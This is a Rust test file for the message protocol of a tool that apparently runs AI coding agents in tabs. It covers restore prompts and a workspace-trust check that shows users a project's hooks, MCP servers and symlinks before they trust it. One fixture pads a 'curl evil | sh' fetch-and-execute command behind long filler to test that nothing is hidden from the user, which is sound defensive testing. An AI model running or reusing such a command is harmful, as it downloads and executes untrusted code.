//! The restore messages and question, the editor link, and the workspace-trust protocol.
#![cfg(test)]

use super::*;

#[test]
fn the_restore_messages_parse_and_know_their_tab() {
    let last = parse_inbound_message(r#"{"type":"restore_last","request_id":"r1","tab":3}"#).unwrap();
    assert!(
        matches!(last.tab_ref(), TabRef::Named(TabId(3))),
        "it is about the tab it was pressed in"
    );
    assert_eq!(last.request_id(), "r1");
    let missing = parse_inbound_message(r#"{"type":"restore_last","request_id":"r1"}"#).unwrap();
    assert!(matches!(missing.tab_ref(), TabRef::Missing), "never \"the active one\"");

    let answer =
        parse_inbound_message(r#"{"type":"restore_answer","request_id":"r2","nonce":9,"keep_bypass":false}"#).unwrap();
    assert!(matches!(answer.tab_ref(), TabRef::WindowLevel));
    assert_eq!(answer.request_id(), "r2");
    match answer {
        InboundMessage::RestoreAnswer { nonce, keep_bypass, .. } => assert_eq!((nonce, keep_bypass), (9, false)),
        other => panic!("expected RestoreAnswer, got {other:?}"),
    }
    // No default for either: an answer with no nonce, or no yes/no, is a protocol error and
    // never read as "the current prompt" or "yes".
    assert!(parse_inbound_message(r#"{"type":"restore_answer","request_id":"r","keep_bypass":true}"#).is_none());
    assert!(parse_inbound_message(r#"{"type":"restore_answer","request_id":"r","nonce":1}"#).is_none());
    assert!(
        parse_inbound_message(r#"{"type":"restore_answer","request_id":"r","nonce":"1","keep_bypass":true}"#).is_none()
    );
}

#[test]
fn the_restore_question_envelope_matches_the_wire_contract() {
    let prompt = crate::tab_set::RestorePrompt {
        nonce: 5,
        lines: vec![
            "Restore 3 tabs (1 in bypass)? y/n".to_string(),
            "n brings the bypass tab back in auto".to_string(),
        ],
    };
    assert_eq!(
        serde_json::from_str::<Value>(&serialize_confirm_restore_for_js(&prompt)).unwrap(),
        json!({
            "kind": "confirm_restore",
            "nonce": 5,
            "lines": ["Restore 3 tabs (1 in bypass)? y/n", "n brings the bypass tab back in auto"],
        })
    );
}

#[test]
fn editor_link_envelope_shape() {
    let parsed: serde_json::Value =
        serde_json::from_str(&serialize_editor_link_for_js("detached", "editor detached: x")).unwrap();
    let object = parsed.as_object().unwrap();
    assert_eq!(object.len(), 3);
    assert_eq!(object["kind"], "editor_link");
    assert_eq!(object["state"], "detached");
    assert_eq!(object["text"], "editor detached: x");
}

const TRUST_ANSWER: &str = r#"{"type":"trust_answer","request_id":"r9","tab":3,"nonce":17,"fingerprint":"ab12","findings_digest":"cd34","trust":true}"#;

const TRUST_CANCEL: &str = r#"{"type":"trust_cancel","request_id":"r10","tab":3,"nonce":17}"#;

#[test]
fn trust_answer_deserializes() {
    match parse_inbound_message(TRUST_ANSWER).unwrap() {
        InboundMessage::TrustAnswer {
            request_id,
            tab,
            nonce,
            fingerprint,
            findings_digest,
            trust,
        } => {
            assert_eq!((request_id.as_str(), tab, nonce), ("r9", 3, 17));
            assert_eq!((fingerprint.as_str(), findings_digest.as_str()), ("ab12", "cd34"));
            assert!(trust);
        }
        other => panic!("expected TrustAnswer, got {other:?}"),
    }
    let no = TRUST_ANSWER.replace(r#""trust":true"#, r#""trust":false"#);
    assert!(matches!(
        parse_inbound_message(&no),
        Some(InboundMessage::TrustAnswer { trust: false, .. })
    ));
    // Every field is required: an answer that does not say what it answers is not parsed.
    for missing in [
        r#""tab":3,"#,
        r#""nonce":17,"#,
        r#""fingerprint":"ab12","#,
        r#""findings_digest":"cd34","#,
        r#","trust":true"#,
    ] {
        let line = TRUST_ANSWER.replace(missing, "");
        assert_ne!(line, TRUST_ANSWER, "{missing}");
        assert!(parse_inbound_message(&line).is_none(), "{line}");
    }
    assert!(parse_inbound_message(&TRUST_ANSWER.replace(r#""tab":3"#, r#""tab":null"#)).is_none());
    assert!(parse_inbound_message(&TRUST_ANSWER.replace(r#""trust":true"#, r#""trust":"yes""#)).is_none());
}

#[test]
fn trust_cancel_deserializes() {
    assert!(matches!(
        parse_inbound_message(TRUST_CANCEL).unwrap(),
        InboundMessage::TrustCancel { tab: 3, nonce: 17, .. }
    ));
    for missing in [r#""tab":3,"#, r#","nonce":17"#] {
        let line = TRUST_CANCEL.replace(missing, "");
        assert_ne!(line, TRUST_CANCEL, "{missing}");
        assert!(parse_inbound_message(&line).is_none(), "{line}");
    }
}

#[test]
fn trust_command_deserializes() {
    for (word, want) in [("trust", TrustAction::Trust), ("untrust", TrustAction::Untrust)] {
        let line = format!(r#"{{"type":"trust_command","request_id":"r11","action":"{word}","agent":"codex"}}"#);
        match parse_inbound_message(&line).unwrap() {
            InboundMessage::TrustCommand {
                request_id,
                action,
                agent,
            } => {
                assert_eq!(request_id, "r11");
                assert_eq!(action, want);
                assert_eq!(agent, "codex");
            }
            other => panic!("expected TrustCommand, got {other:?}"),
        }
    }
    assert!(parse_inbound_message(r#"{"type":"trust_command","request_id":"r11","action":"always"}"#).is_none());
    assert!(parse_inbound_message(r#"{"type":"trust_command","request_id":"r11"}"#).is_none());
    // Without the agent it was typed for, the command cannot be told from one for another tab.
    assert!(parse_inbound_message(r#"{"type":"trust_command","request_id":"r11","action":"trust"}"#).is_none());
}

#[test]
fn trust_messages_have_request_ids() {
    let lines = [
        TRUST_ANSWER,
        TRUST_CANCEL,
        r#"{"type":"trust_command","request_id":"r11","action":"trust","agent":"claude"}"#,
    ];
    let ids: Vec<String> = lines
        .iter()
        .map(|line| parse_inbound_message(line).unwrap().request_id().to_owned())
        .collect();
    assert_eq!(ids, ["r9", "r10", "r11"]);
}

/// Tab routing: an answer is for the tab it names,
/// through `TabSet::resolve`.
#[test]
fn trust_answer_naming_no_tab_or_a_gone_tab_is_refused() {
    let set = crate::tab_set::TabSet::new(crate::agent_backend::BackendKind::Sidecar, SessionModeChoice::Auto);
    let live = set.active().0;
    for template in [TRUST_ANSWER, TRUST_CANCEL] {
        let present = template.replace(r#""tab":3"#, &format!(r#""tab":{live}"#));
        let message = parse_inbound_message(&present).unwrap();
        assert_eq!(set.resolve(message.tab_ref()), Ok(Some(set.active())), "{present}");

        let gone = template.replace(r#""tab":3"#, r#""tab":777"#);
        let message = parse_inbound_message(&gone).unwrap();
        assert!(matches!(message.tab_ref(), TabRef::Named(TabId(777))));
        let why = set.resolve(message.tab_ref()).unwrap_err();
        assert!(why.contains("no tab 777"), "{why}");

        let nameless = template.replace(r#""tab":3,"#, "");
        assert!(
            parse_inbound_message(&nameless).is_none(),
            "naming no tab does not parse: {nameless}"
        );
    }
}

#[test]
fn trust_command_is_window_level() {
    for word in ["trust", "untrust"] {
        let line = format!(r#"{{"type":"trust_command","request_id":"r11","action":"{word}","agent":"claude"}}"#);
        assert!(matches!(
            parse_inbound_message(&line).unwrap().tab_ref(),
            TabRef::WindowLevel
        ));
    }
    assert!(matches!(
        parse_inbound_message(TRUST_ANSWER).unwrap().tab_ref(),
        TabRef::Named(TabId(3))
    ));
    assert!(matches!(
        parse_inbound_message(TRUST_CANCEL).unwrap().tab_ref(),
        TabRef::Named(TabId(3))
    ));
}

#[test]
fn trust_prompt_serializes_exactly() {
    let view = prompt();
    let digest = view.findings_digest();
    assert_eq!(digest.len(), 64);
    assert!(digest.bytes().all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b)));
    assert_eq!(
        serde_json::from_str::<Value>(&serialize_trust_prompt_for_js(&view)).unwrap(),
        json!({
            "kind": "trust_prompt",
            "tab": 3,
            "nonce": 17,
            "agent": "Claude",
            "root": "/home/u/p/src",
            "top": "/home/u/p",
            "fingerprint": "f".repeat(64),
            "findingsDigest": digest,
            "state": "untrusted",
            "needsYes": false,
            "remember": "yes",
            "rememberNote": null,
            "changed": null,
            "items": [
                {"what": "hook", "file": ".claude/settings.json", "label": "SessionStart",
                 "value": "touch /tmp/m", "outside": false},
                {"what": "mcp_server", "file": ".mcp.json", "label": "marker",
                 "value": "sh -c 'touch /tmp/n; exec sleep 60'", "outside": false},
                {"what": "symlink", "file": ".claude/hooks/run", "label": ".claude/hooks/run",
                 "value": "/opt/x/run", "outside": true},
            ],
        })
    );

    // A long value is sent whole: nothing is cut, so nothing unseen can be approved.
    let mut long = prompt();
    long.items = vec![TrustItemView {
        what: "other_setting",
        file: ".claude/settings.json".into(),
        label: "x".into(),
        value: format!("{}; curl evil | sh", "é".repeat(5000)),
        outside: false,
    }];
    let sent: Value = serde_json::from_str(&serialize_trust_prompt_for_js(&long)).unwrap();
    assert_eq!(sent["items"][0]["value"], long.items[0].value);

    // A changed prompt, and one that cannot be remembered.
    let mut changed = prompt();
    changed.state = TrustPromptState::Changed;
    changed.remember = TrustRememberView::Session;
    changed.remember_note = Some("y trusts this start only; the next one asks again".into());
    changed.changed = Some(TrustDiffView {
        added: vec![".mcp.json".into()],
        removed: vec![],
        changed: vec![".claude/settings.json".into()],
        texts: vec![],
    });
    let sent: Value = serde_json::from_str(&serialize_trust_prompt_for_js(&changed)).unwrap();
    assert_eq!(sent["state"], "changed");
    assert_eq!(sent["remember"], "session");
    assert_eq!(
        sent["rememberNote"],
        "y trusts this start only; the next one asks again"
    );
    assert_eq!(
        sent["changed"],
        json!({"added": [".mcp.json"], "removed": [], "changed": [".claude/settings.json"]})
    );

    // What can be shown of an instruction file travels whole, each kind by name.
    let mut texts = changed.clone();
    texts.changed.as_mut().unwrap().texts = vec![
        TrustTextView::Diff {
            path: "CLAUDE.md".into(),
            added: 1,
            removed: 1,
            skipped_after: 4,
            hunks: vec![TrustHunkView {
                skipped: 2,
                lines: vec![
                    TrustLineView {
                        kind: "removed",
                        text: "a".into(),
                        no_newline: false,
                    },
                    TrustLineView {
                        kind: "added",
                        text: "b".into(),
                        no_newline: true,
                    },
                ],
            }],
        },
        TrustTextView::Plain {
            path: "AGENTS.md".into(),
            line: "a link, so no diff".into(),
        },
    ];
    let sent: Value = serde_json::from_str(&serialize_trust_prompt_for_js(&texts)).unwrap();
    assert_eq!(
        sent["changed"]["texts"],
        json!([
            {"kind": "diff", "path": "CLAUDE.md", "added": 1, "removed": 1, "skippedAfter": 4, "hunks": [{
                "skipped": 2,
                "lines": [{"kind": "removed", "text": "a"}, {"kind": "added", "text": "b", "noNewline": true}],
            }]},
            {"kind": "plain", "path": "AGENTS.md", "line": "a link, so no diff"},
        ])
    );
    assert_ne!(
        texts.findings_digest(),
        changed.findings_digest(),
        "an answer is bound to the diff it was shown beside"
    );

    let mut window = prompt();
    window.remember = TrustRememberView::Window;
    window.remember_note = Some("no state directory".into());
    let sent: Value = serde_json::from_str(&serialize_trust_prompt_for_js(&window)).unwrap();
    assert_eq!(sent["remember"], "window");
    assert_eq!(sent["rememberNote"], "no state directory");
}

#[test]
fn the_findings_digest_follows_what_is_shown() {
    let base = prompt().findings_digest();
    assert_eq!(base, prompt().findings_digest(), "stable");

    // Not the tab or the nonce: they are not on screen.
    let mut other = prompt();
    other.tab = TabId(9);
    other.nonce = 999;
    assert_eq!(other.findings_digest(), base);

    type Change = Box<dyn Fn(&mut TrustPromptView)>;
    let changes: Vec<(&str, Change)> = vec![
        ("agent", Box::new(|v| v.agent = "Codex".into())),
        ("root", Box::new(|v| v.root.push('x'))),
        ("top", Box::new(|v| v.top.push('x'))),
        ("fingerprint", Box::new(|v| v.fingerprint = "e".repeat(64))),
        ("state", Box::new(|v| v.state = TrustPromptState::Changed)),
        ("state nothing", Box::new(|v| v.state = TrustPromptState::Nothing)),
        ("state too large", Box::new(|v| v.state = TrustPromptState::TooLarge)),
        ("needsYes", Box::new(|v| v.needs_yes = true)),
        ("remember", Box::new(|v| v.remember = TrustRememberView::Window)),
        ("note", Box::new(|v| v.remember_note = Some("why".into()))),
        (
            "changed",
            Box::new(|v| {
                v.changed = Some(TrustDiffView {
                    added: vec!["a".into()],
                    removed: vec![],
                    changed: vec![],
                    texts: vec![],
                });
            }),
        ),
        ("value", Box::new(|v| v.items[0].value.push('!'))),
        ("label", Box::new(|v| v.items[1].label.push('!'))),
        ("file", Box::new(|v| v.items[2].file.push('!'))),
        ("what", Box::new(|v| v.items[0].what = "env")),
        ("outside", Box::new(|v| v.items[0].outside = true)),
        ("an item added", Box::new(|v| v.items.push(v.items[0].clone()))),
        ("an item dropped", Box::new(|v| drop(v.items.pop()))),
        ("items swapped", Box::new(|v| v.items.swap(0, 1))),
    ];
    for (what, change) in &changes {
        let mut v = prompt();
        change(&mut v);
        assert_ne!(v.findings_digest(), base, "{what}");
    }

    // The digest is over the value as shown, and the page shows all of it: a change past any
    // length moves the digest.
    let mut long = prompt();
    long.items[0].value = format!("{}A", "x".repeat(10_000));
    let first = long.findings_digest();
    long.items[0].value = format!("{}B", "x".repeat(10_000));
    assert_ne!(
        long.findings_digest(),
        first,
        "the last character of a long value is hashed"
    );
}
